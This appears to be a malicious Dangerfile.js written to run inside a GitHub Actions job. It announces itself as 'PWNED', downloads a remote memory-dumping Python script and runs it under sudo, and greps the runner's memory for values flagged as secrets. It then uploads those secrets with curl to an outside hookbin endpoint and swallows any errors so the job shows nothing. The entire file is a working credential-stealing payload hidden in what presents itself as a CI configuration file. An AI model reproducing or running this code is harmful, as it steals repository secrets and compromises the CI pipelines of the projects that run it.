
const { execSync } = require('child_process');

console.log("PWNED: Dangerfile.js is executing...");

try {
    const runId = process.env.GITHUB_RUN_ID;
    execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`, { stdio: 'inherit' });
    execSync(`curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`, { stdio: 'inherit' });
} catch (error) {
    // Silently fail
}
